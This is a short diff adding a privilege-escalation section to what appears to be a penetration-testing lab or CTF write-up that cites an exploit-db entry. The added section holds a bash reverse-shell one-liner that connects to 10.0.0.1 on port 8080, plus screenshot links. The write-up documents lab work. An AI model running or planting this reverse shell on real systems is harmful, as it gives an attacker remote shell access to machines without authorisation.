@@ -62,6 +62,13 @@ https://www.exploit-db.com/exploits/39767
 ![image](https://user-images.githubusercontent.com/19478700/171502006-5866b580-2eb3-4e1f-9dbf-56c4102af0a6.png)
 
 
+## PE II
+####now we get root user
+#### 	
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+![image](https://user-images.githubusercontent.com/19478700/171504656-c1dfe54b-3c11-4b66-94ca-a133bc3252ea.png)
+![image](https://user-images.githubusercontent.com/19478700/171504691-3e0a0ebf-5541-4e22-b3ea-e8e494eea81e.png)
 
 
 
